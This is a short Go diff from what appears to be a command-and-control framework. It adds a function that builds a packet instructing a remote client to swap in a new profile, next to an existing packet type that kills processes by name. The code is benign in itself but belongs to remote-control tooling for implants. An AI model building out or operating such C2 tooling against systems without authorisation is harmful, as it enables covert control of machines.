@@ -241,6 +241,25 @@ func Touch(s string) *com.Packet {
 	return n
 }
 
+// Profile returns an update profile Packet. This can be used to instruct the
+// client to set it's profile to the raw Profile bytes supplied.
+//
+// IT IS RECOMMENDED TO USE THE 'Session.SetProfile' CALL INSTEAD TO PREVENT DE-SYNC
+// ISSSUES BETWEEN SERVER AND CLIENT. HERE ONLY FOR USAGE IN SCRIPTS.
+//
+// C2 Details:
+//  ID: MvProfile
+//
+//  Input:
+//      []byte // Profile
+//  Output:
+//      <none>
+func Profile(b []byte) *com.Packet {
+	n := &com.Packet{ID: MvProfile}
+	n.WriteBytes(b)
+	return n
+}
+
 // KillName returns a process kill Packet. This can be used to instruct to send
 // a SIGKILL signal all to the specified processes that have the specified name.
 //
